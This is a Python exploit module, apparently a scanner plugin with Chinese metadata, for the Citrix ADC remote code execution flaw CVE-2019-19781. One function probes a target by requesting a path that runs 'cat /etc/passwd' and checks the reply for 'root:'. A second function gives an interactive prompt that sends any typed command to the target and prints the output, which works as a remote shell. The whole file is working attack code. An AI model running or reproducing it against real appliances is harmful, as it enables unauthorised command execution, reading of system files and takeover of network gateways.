#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import urllib.parse
def msg():
  ret = {

      'links'     :  'https://nosec.org/home/detail/4504.html',

      'huixian'   :  '该脚本存在可利用exp',

      'method'    :   'get',

      'bugname'   :   'Citrix ADC 远程代码执行漏洞（CVE-2019-19781）',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Host':'citrix.host',
      }
  target = '/vpns/portal/scripts/RCE.pl?command=cat+/etc/passwd'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and "root:" in res.text:
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret
def exp(url):
  headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
    }
  print('[+] 开始执行命令(输入exit退出)!')
  cmd = ''
  try:
    while cmd != 'exit':
      cmd = input('[+]输入命令,空格用加号代替 >')
      try:
        vurl = urllib.parse.urljoin(url, '/vpns/portal/scripts/RCE.pl?command='+cmd)
        rep = requests.get(vurl, headers=headers, verify=False, allow_redirects=False, timeout=3)
        if rep.status_code == 200:
          print('[+] 执行结果: ', rep.text)
      except:
        print('[+] 执行超时，请检查是否成功?')
    return True
  except:
    return False